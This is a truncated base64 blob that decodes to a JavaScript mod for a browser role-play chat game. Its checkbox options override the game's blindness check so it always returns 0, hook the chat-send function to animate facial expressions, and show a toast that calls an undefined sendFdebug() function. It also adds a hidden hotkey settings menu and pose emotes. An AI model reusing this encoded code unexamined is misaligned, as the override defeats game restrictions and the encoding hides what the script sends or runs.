iI7Cm9wdGlvbjEuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwpvcHRpb24xLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKb3B0aW9uMS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgpvcHRpb24yLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7Cm9wdGlvbjIuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAiY2VudGVyIjsKb3B0aW9uMi5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7Cm9wdGlvbjIuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwpvcHRpb24yLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKb3B0aW9uMi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgpvcHRpb24zLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7Cm9wdGlvbjMuc3R5bGUuanVzdGlmeUNvbnRlbnQgPSAiY2VudGVyIjsKb3B0aW9uMy5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7Cm9wdGlvbjMuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwpvcHRpb24zLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKb3B0aW9uMy5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgpvcHRpb24xLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZW50ZXIiLCBmdW5jdGlvbigpIHsKICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkIjsKICBvcHRpb24xLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKfSk7CgpvcHRpb24xLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbGVhdmUiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImxpZ2h0Z3JlZW4iOwogIH0gZWxzZSB7CiAgICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKb3B0aW9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWVudGVyIiwgZnVuY3Rpb24oKSB7CiAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZCI7CiAgb3B0aW9uMi5zdHlsZS5jdXJzb3IgPSAicG9pbnRlciI7Cn0pOwoKb3B0aW9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZWxlYXZlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJsaWdodGdyZWVuIjsKICB9IGVsc2UgewogICAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCm9wdGlvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VlbnRlciIsIGZ1bmN0aW9uKCkgewogIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGQiOwogIG9wdGlvbjMuc3R5bGUuY3Vyc29yID0gInBvaW50ZXIiOwp9KTsKCm9wdGlvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VsZWF2ZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAibGlnaHRncmVlbiI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgovLyBDaGVja2JveCBzdGF0ZSB3aGVuIHRoZSBwYWdlIGxvYWRzCmNoZWNrYm94MS5jaGVja2VkID8gb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCIgOiBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKY2hlY2tib3gyLmNoZWNrZWQgPyBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IiA6IG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwpjaGVja2JveDMuY2hlY2tlZCA/IG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiIDogb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CgoKLy8gQ2hhbmdlIGxhYmVsIGJhY2tncm91bmQgY29sb3Igd2hlbiB0aGUgY2hlY2tib3ggaXMgY2hlY2tlZApjaGVja2JveDEuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICBvcHRpb24xLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IjsKICB9IGVsc2UgewogICAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCmNoZWNrYm94Mi5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgIG9wdGlvbjIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiOwogIH0gZWxzZSB7CiAgICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKY2hlY2tib3gzLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgb3B0aW9uMy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgovL09wdGlvbnMgQWN0aW9uc19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgpmdW5jdGlvbiBydW5PcHRpb24xKCkgewogICAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICAgIGZ1bmN0aW9uIEdldEJsaW5kTGV2ZWwwKCkgewogICAgICAgIGxldCBibGluZExldmVsID0gMDsKICAgICAgICByZXR1cm4gYmxpbmRMZXZlbDsKICAgICAgfQogICAgICBQbGF5ZXIuR2V0QmxpbmRMZXZlbCA9IEdldEJsaW5kTGV2ZWwwOwogICAgICBQbGF5ZXIuR2V0QmxpbmRMZXZlbCgpOwogICAgfQogIH0KICAKICBmdW5jdGlvbiBydW5PcHRpb24yKCkgewogICAgZnVuY3Rpb24gUnVuRXhwcmVzc2lvbkFuaW1hdGlvblN0ZXAoKSB7CiAgICAgIENoYXJhY3RlclNldEZhY2lhbEV4cHJlc3Npb24oUGxheWVyLCAiTW91dGgiLCBleHByZXNzaW9uQW5pbWF0aW9uW2V4cHJlc3Npb25BbmltYXRpb25JbmRleCsrXSk7CiAgICAgIGlmIChleHByZXNzaW9uQW5pbWF0aW9uSW5kZXggPCBleHByZXNzaW9uQW5pbWF0aW9uLmxlbmd0aCkgewogICAgICAgIHNldFRpbWVvdXQoUnVuRXhwcmVzc2lvbkFuaW1hdGlvblN0ZXAsIDEwMDApOwogICAgICB9IGVsc2UgewogICAgICAgIGV4cHJlc3Npb25BbmltYXRpb24gPSBudWxsOwogICAgICB9CiAgICB9CiAgCiAgICBmdW5jdGlvbiBSdW5FeHByZXNzaW9uQW5pbWF0aW9uKGxpc3QpIHsKICAgICAgaWYgKGV4cHJlc3Npb25BbmltYXRpb24pIHsKICAgICAgICByZXR1cm47CiAgICAgIH0KICAgICAgZXhwcmVzc2lvbkFuaW1hdGlvbiA9IGxpc3Q7CiAgICAgIGV4cHJlc3Npb25BbmltYXRpb25JbmRleCA9IDA7CiAgICAgIGV4cHJlc3Npb25BbmltYXRpb25FeCA9IEludmVudG9yeUdldChQbGF5ZXIsICJNb3V0aCIpOwogICAgICBpZiAoZXhwcmVzc2lvbkFuaW1hdGlvbkV4ICYmIGV4cHJlc3Npb25BbmltYXRpb25FeC5Qcm9wZXJ0eSAmJiBleHByZXNzaW9uQW5pbWF0aW9uRXguUHJvcGVydHkuRXhwcmVzc2lvbikgewogICAgICAgIGV4cHJlc3Npb25BbmltYXRpb25bZXhwcmVzc2lvbkFuaW1hdGlvbi5sZW5ndGggLSAxXSA9IGV4cHJlc3Npb25BbmltYXRpb25FeC5Qcm9wZXJ0eS5FeHByZXNzaW9uOyAvL3NldCBsYXN0IHRvIGN1cnJlbnQKICAgICAgfQogICAgICBSdW5FeHByZXNzaW9uQW5pbWF0aW9uU3RlcCgpOwogICAgfQogIAogICAgZnVuY3Rpb24gTkVXdGFsa2luZygpIHsKICAgICAgdmFyIG1zZyA9IEVsZW1lbnRWYWx1ZSgiSW5wdXRDaGF0IikudHJpbSgpOwogICAgICBpZiAoIW1zZy5zdGFydHNXaXRoKCIvIikgJiYgIW1zZy5zdGFydHNXaXRoKCIqIikgJiYgIW1zZy5zdGFydHNXaXRoKCIhIikpIHsKICAgICAgICBpZiAobXNnLmxlbmd0aCA+IDEwKSB7CiAgICAgICAgICBSdW5FeHByZXNzaW9uQW5pbWF0aW9uKFtudWxsLCAiR3JpbiIsICJTbWlyayIsIG51bGwsICJHcmluIiwgIlNtaXJrIiwgbnVsbF0pOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICBSdW5FeHByZXNzaW9uQW5pbWF0aW9uKFtudWxsLCAiR3JpbiIsICJTbWlyayIsIG51bGxdKTsKICAgICAgICB9CiAgICAgIH0KICAgICAgT0xEdGFsa2luZygpOwogICAgfQogIAogICAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICAgIHZhciBleHByZXNzaW9uQW5pbWF0aW9uOwogICAgICB2YXIgZXhwcmVzc2lvbkFuaW1hdGlvbkluZGV4ID0gMDsKICAgICAgdmFyIE9MRHRhbGtpbmcgPSBDaGF0Um9vbVNlbmRDaGF0OwogICAgICBDaGF0Um9vbVNlbmRDaGF0ID0gTkVXdGFsa2luZzsKICAgIH0KICB9CgogIGZ1bmN0aW9uIHJ1bk9wdGlvbjMoKSB7CiAgICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgICAgZnVuY3Rpb24gc2hvd1RvYXN0c2NwZygpIHsKICAgICAgICBBdWRpb1BsYXlJbnN0YW50U291bmQoImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDkwNTMwNDc5MDgzNjMwNjcyL2g0MnZ3Y2Qtbm90aWZpY2F0aW9uLTFfdk1xaFZsdFMubXAzIiwgMSk7CiAgICAgICAgLy8gQ3JlYXRlIHRoZSB0b2FzdCBjb250YWluZXIKICAgICAgICB2YXIgdG9hc3RDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucmlnaHQgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkICM0Q0FGNTAiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJveFNoYWRvdyA9ICIycHggMnB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjVzIGVhc2UtaW4tb3V0IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgICAgIHZhciBzdGF0dXNCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKICAgIHN0YXR1c0Jhci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwogICAgc3RhdHVzQmFyLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CiAgICBzdGF0dXNCYXIuc3R5bGUubGVmdCA9ICIwIjsKICAgIHN0YXR1c0Jhci5zdHlsZS50cmFuc2l0aW9uID0gIndpZHRoIDVzIGVhc2UtaW4tb3V0IjsKICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChzdGF0dXNCYXIpOwogICAgCiAgICAKICAgIC8vIFVwZGF0ZSB0aGUgd2lkdGggb2YgdGhlIHN0YXR1cyBiYXIgYXMgaXQgY291bnRzIGRvd24KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgIH0sIDApOwogICAgICAgIAogICAgLy8gQWRkIHRoZSBjdXN0b20gQkNNIGljb24KICAgIHZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICBpY29uLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogICAgaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKICAgIGljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKICAgIGljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChpY29uKTsKICAgIAogICAgLy8gQWRkIHRoZSB0ZXh0IG1lc3NhZ2UKICAgIHZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwogICAgdGV4dC5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwogICAgdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwogICAgdGV4dC5pbm5lckhUTUwgPSAiQWN0aW9uIFN1Y2Nlc3NmdWxseSBFeGVjdXRlZCI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0KTsKICAgIAogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CiAgICAgIAogICAgICAgIC8vIFNob3cgdGhlIHRvYXN0IHdpdGggYSBmYWRlIGluIGFuaW1hdGlvbgogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7CiAgICAgICAgfSwgMCk7CiAgICAgIAogICAgICAgIC8vIEhpZGUgdGhlIHRvYXN0IHdpdGggYSBmYWRlIG91dCBhbmltYXRpb24KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB9LCA1MDAwKTsKICAgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgfSwgNTUwMCk7CiAgICAgICAgc2VuZEZkZWJ1ZygpOwogICAgCiAgICAgIH0KCiAgICB9CiAgfQoKICAvLyBMb2FkIHRoZSBjaGVja2JveCBzdGF0ZXMgZnJvbSBsb2NhbCBzdG9yYWdlCiAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24xIikgIT09IG51bGwpIHsKICAgIGNoZWNrYm94MS5jaGVja2VkID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjEiKSA9PT0gInRydWUiOwogICAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjEsIDEwMDApOwogICAgfQogIH0KICAKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjIiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gyLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMiIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMiwgMTAwMCk7CiAgICB9CiAgfQoKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjMiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gzLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMywgMTAwMCk7CiAgICB9CiAgfQogIAogIGNoZWNrYm94MS5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24xIiwgY2hlY2tib3gxLmNoZWNrZWQpOwogICAgaWYgKGNoZWNrYm94MS5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjEsIDEwMDApOwogICAgfQogIH0pOwogIAogIGNoZWNrYm94Mi5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24yIiwgY2hlY2tib3gyLmNoZWNrZWQpOwogICAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjIsIDEwMDApOwogICAgfQogIH0pOwoKICBjaGVja2JveDMuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMyIsIGNoZWNrYm94My5jaGVja2VkKTsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24zLCAxMDAwKTsKICAgIH0KICB9KTsKICAKCi8vT3B0aW9ucyBTdGF0ZXNfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKLy8gU2F2ZSB0aGUgY2hlY2tib3ggc3RhdGVzIHRvIGxvY2FsIHN0b3JhZ2UgCmNoZWNrYm94MS5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMSIsIGNoZWNrYm94MS5jaGVja2VkKTsKfSk7CgpjaGVja2JveDIuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjIiLCBjaGVja2JveDIuY2hlY2tlZCk7Cn0pOwoKY2hlY2tib3gzLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24zIiwgY2hlY2tib3gzLmNoZWNrZWQpOwp9KTsKCgpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNldHRpbmdzTWVudSk7CgpsZXQgaXNCYWNrdGlja1ByZXNzZWQgPSBmYWxzZTsKbGV0IGlzU1ByZXNzZWQgPSBmYWxzZTsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCBmdW5jdGlvbihldmVudCkgewogIGlmIChldmVudC5rZXkgPT09ICJgIikgewogICAgaXNCYWNrdGlja1ByZXNzZWQgPSB0cnVlOwogIH0gZWxzZSBpZiAoZXZlbnQua2V5ID09PSAicyIpIHsKICAgIGlzU1ByZXNzZWQgPSB0cnVlOwogIH0KCiAgaWYgKGlzQmFja3RpY2tQcmVzc2VkICYmIGlzU1ByZXNzZWQpIHsKICAgIHNldHRpbmdzTWVudS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICB9Cn0pOwoKLy8gSGlkZSBzZXR0aW5ncyBtZW51IHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9mZgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgICBjb25zdCB0YXJnZXRFbGVtZW50ID0gZXZlbnQudGFyZ2V0OwogICAgY29uc3QgaXNTZXR0aW5nc01lbnUgPSAhIXRhcmdldEVsZW1lbnQuY2xvc2VzdCgiI3NldHRpbmdzLW1lbnUiKTsKICAgIAogICAgaWYgKCFpc1NldHRpbmdzTWVudSkgewogICAgICBzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIH0KICB9KTsKICAKICAKCiAgCgovLyBDbGVhciB0aGUgZmxhZ3Mgd2hlbiB0aGUgdXNlciByZWxlYXNlcyBlaXRoZXIga2V5CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleXVwIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBpZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICAgIGlzQmFja3RpY2tQcmVzc2VkID0gZmFsc2U7CiAgfSBlbHNlIGlmIChldmVudC5rZXkgPT09ICJzIikgewogICAgaXNTUHJlc3NlZCA9IGZhbHNlOwogIH0KfSk7CgoKLy9FbmQgb2YgUGVyc2lzdGFudCBNZW51IF9fX19fX19fX19fX19fX19fX19fXwoKLy9TdGFydCBvZiBFbW90ZSBNZW51IF9fX19fX19fX19fX19fX19fX19fXwoKY29uc3QgYnV0dG9uRGF0YSA9IFsKICB7IG5hbWU6ICJQdWxsLVVwcyIsIGFjdGlvbjogKCkgPT4gewogICAgICAgIHNob3dUb2FzdHNjcGcoKTsKICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAxMzAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCAxMDAwKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc0Nsb3NlZCIpOwogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMjUwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgMjAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKCiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpCiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAxMzAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCAzMDAwKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc0Nsb3NlZCIpOwogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMjUwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgNDAwMCk7ICAgIAogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpCiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAxMzAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZSh